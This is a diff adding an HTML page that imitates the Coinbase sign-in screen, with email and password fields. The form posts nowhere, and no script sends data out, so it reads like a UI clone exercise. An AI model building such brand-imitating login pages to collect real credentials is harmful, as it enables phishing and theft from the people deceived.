@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Coinbase - Sign In</title>
+  <style>
+    *{
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      text-decoration: none;
+    }
+    body{
+      color-scheme:dark;
+      background-color: #3B3B3B;
+    }
+#container{
+  width: max-content;
+color: white;
+position: absolute;
+top: 50%;
+left: 50%;
+transform: translate(-50%, -50%);
+width: max-content;
+height: 80vh;
+padding: 40px 40px 0 40px;
+border: 2px solid grey;
+border-radius: 15px;
+}
+.container form  h2{
+margin: 10px;
+font-weight: 600;
+
+}
+  </style>
+</head>
+<body>
+
+<div id="container">
+  <form action="">
+    <h2>coinbase</h2>
+    <h2>Sign in to Coinbase</h2>
+ <div>   <label for="email">Email</label>
+  <input type="email" name="email" id="email"></div>
+  <div>   <label for="password">Password</label>
+    <input type="password" name="password" id="password"></div>
+    <p>Not your device? Use incognito mode to sign in privately.</p>
+<button type="submit">Continue</button>
+<a href="signup">Create account</a>
+  </form>
+<a href="business">Sign in to a business account</a>
+<a href="privacy">Privacy policy</a>
+</div>
+</body>
+</html>
